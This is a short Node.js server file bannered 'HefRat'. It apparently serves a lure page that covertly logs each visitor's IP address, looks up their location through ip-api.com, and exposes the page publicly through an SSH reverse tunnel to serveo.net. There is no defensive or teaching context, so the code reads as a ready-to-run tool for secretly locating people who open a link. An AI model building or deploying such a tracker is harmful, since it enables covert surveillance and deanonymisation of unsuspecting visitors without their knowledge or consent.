const express = require('express');
const fs = require('fs');
const app = express();
const http = require('http')
const { spawn } = require('child_process');
//const cors = require('cors');
const figlet = require('figlet');
const port = 8080;
const banner = "HefRat";
const host = "127.0.0.1";

//app.use(express.static('./suim'))

app.get(('/server'), (req, res)  => {
const userIp = req.headers['x-forwarded-for'] || req.ip;
console.log('[!] UserIP => ', userIp);
//http.get(`http://ipinfo.io/${userIp}/geo`, (resp) => {
http.get(`http://ip-api.com/json/${userIp}`, (resp) => {
let data = '';

resp.on('data', (chunk) => {
data += chunk;
});
resp.on('end', () => {
const parsedData = JSON.parse(data);
const formattedData = JSON.stringify(parsedData, null, 2);
console.log(formattedData);
})
})

res.sendFile(__dirname + '/suim/index.html');
});

app.listen(port, host, () => {
figlet.text(banner, {font: 'Small'}, (err, data) => {
if (err){
console.log('Erro:', err)
return;
}
console.log(data);
console.log('[!] Server running => ', port)

    const sshProcess = spawn('ssh', ['-R', '80:localhost:8080', 'serveo.net'], { stdio: 'inherit' });

    sshProcess.on('close', (code) => {
        console.log(` SSH code ${code}`);
    });

//console.log('[!] Server running => ', port)
});
});
